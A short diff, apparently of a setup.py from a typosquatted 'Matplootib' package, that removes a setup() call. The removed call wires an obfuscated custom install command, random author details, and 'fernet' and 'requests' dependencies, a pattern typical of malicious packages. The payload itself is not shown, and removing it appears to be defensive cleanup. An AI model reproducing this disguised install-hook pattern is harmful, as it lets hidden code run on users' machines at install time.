@@ -18,22 +18,5 @@ class elauOyeUgKRzuGhkoFpEsAioPOpTxsWiqVkKoapFYYVbFqnOvbUYsSLHZfCvzBOQaAwdZsUGaG
             install.run(self)
 
 
-setup(
-    name="Matplootib",
-    version=VERSION,
-    author="WVIgHWfymwdtKfq",
-    author_email="RuQiAHJbxEeVq@gmail.com",
-    description=DESCRIPTION,
-    long_description_content_type="text/markdown",
-    long_description=LONG_DESCRIPTION,
-    cmdclass={
-        'install': elauOyeUgKRzuGhkoFpEsAioPOpTxsWiqVkKoapFYYVbFqnOvbUYsSLHZfCvzBOQaAwdZsUGaGmcNHHFnzIvaxfYzCmsksvYcesqlrlYgngylsUbKcmOBhiZOeNpMuWgENPgWMguBkjpOduUJBux,
-    },
-    packages=find_packages(),
-    setup_requires=['fernet', 'requests'],
-    keywords=[],
-    classifiers=[
-        "Operating System :: Microsoft :: Windows",
-    ]
-)
+# setup(...) removed                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      
 
